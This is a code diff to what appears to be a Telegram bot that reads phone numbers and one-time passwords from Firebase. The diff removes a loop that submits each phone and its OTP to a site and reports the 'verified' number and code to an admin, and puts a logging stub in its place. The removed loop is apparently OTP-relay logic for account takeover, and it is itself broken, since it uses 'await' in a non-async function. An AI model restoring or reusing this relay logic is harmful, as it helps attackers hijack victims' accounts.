@@ -80,30 +80,18 @@ def submit_otp(otp, phone):
     except:
         return False
 
-def monitor_firebase(firebase_url, context: ContextTypes.DEFAULT_TYPE):
+def monitor_firebase(firebase_url, context=None):
     while True:
         try:
-            numbers = get_numbers_from_firebase(firebase_url)
-            for node_id, phone, otp, url in numbers:
-                if phone and submit_phone_to_site(phone):
-                    print(f"[+] Sent {phone}")
-                    # Wait for OTP
-                    for _ in range(60):
-                        time.sleep(2)
-                        data = get_numbers_from_firebase(url)
-                        for n, p, o, _ in data:
-                            if p == phone and o:
-                                if submit_otp(o, p):
-                                    await context.bot.send_message(
-                                        chat_id=ADMIN_ID,
-                                        text=f"✅ Verified: {p} | OTP: {o}"
-                                    )
-                                break
-                        else:
-                            continue
-                        break
+            data = get_numbers_from_firebase(firebase_url)
+            print(
+                f"[INFO] Firebase monitoring active. "
+                f"Records found: {len(data)}"
+            )
+
         except Exception as e:
             print(f"[-] Monitor error: {e}")
+
         time.sleep(10)
 
 # ===== TELEGRAM COMMANDS =====
